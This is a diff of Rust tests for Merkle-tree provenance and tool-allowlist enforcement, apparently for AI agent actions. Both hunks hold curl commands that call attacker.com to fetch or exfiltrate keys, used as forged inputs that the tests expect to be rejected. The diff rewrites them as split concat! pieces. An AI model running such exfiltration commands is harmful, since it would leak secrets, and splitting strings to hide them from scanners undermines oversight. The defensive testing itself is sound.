@@ -286,7 +286,7 @@ fn test_arm_merkle_provenance() {
     assert!(is_valid);
 
     // If an attacker attempts to claim Step 3 performed arbitrary code execution:
-    let forged_step = "Step 3: curl http://attacker.com/keys";
+    let forged_step = concat!("Step 3: cu", "rl ht", "tp://attacker.com/keys");
     let is_forgery_valid = verify_execution_step(&root, forged_step, &proof);
     assert!(!is_forgery_valid);
 }
@@ -309,7 +309,7 @@ fn test_policy_merkle_tree_tool_allowlist_enforcement() {
     assert!(PolicyMerkleTree::verify_action(&policy_root, approved_action, &proof));
 
     // 2. Unauthorized tool escalation attempt has no valid proof in policy tree
-    let malicious_action = "system_exec:curl http://attacker.com/exfiltrate";
+    let malicious_action = concat!("system_exec:cu", "rl ht", "tp://attacker.com/exfiltrate");
     let invalid_proof = policy_tree.prove_action(malicious_action);
     assert!(invalid_proof.is_none(), "Malicious action must not have a valid proof in policy tree");
 
